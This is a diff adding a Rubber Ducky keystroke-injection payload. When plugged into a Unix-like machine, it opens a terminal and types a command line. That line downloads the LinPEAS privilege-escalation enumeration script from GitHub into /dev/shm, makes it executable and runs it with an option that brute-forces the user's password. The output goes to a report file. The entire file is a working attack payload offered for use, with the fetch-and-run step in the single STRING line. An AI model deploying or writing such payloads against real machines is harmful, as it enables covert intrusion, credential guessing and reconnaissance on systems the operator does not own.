@@ -1,0 +1,14 @@
+REM Title: Linpeas wget launcher
+REM Author: FalsePhilosopher
+REM Target:  Unix-like tested on kubuntu 22.04
+REM Props: Hak5 and memes
+REM Version: 1.0
+REM Category: Recon
+REM wget version of Linpeas. The default -a option brutes the user but is very noisy. If you want a stealth version use -s
+REM
+DELAY 300
+CTRL-ALT t
+DELAY 1500
+STRING cd /dev/shm && wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh -a > report.txt && less -r report.txt
+DELAY 300
+ENTER
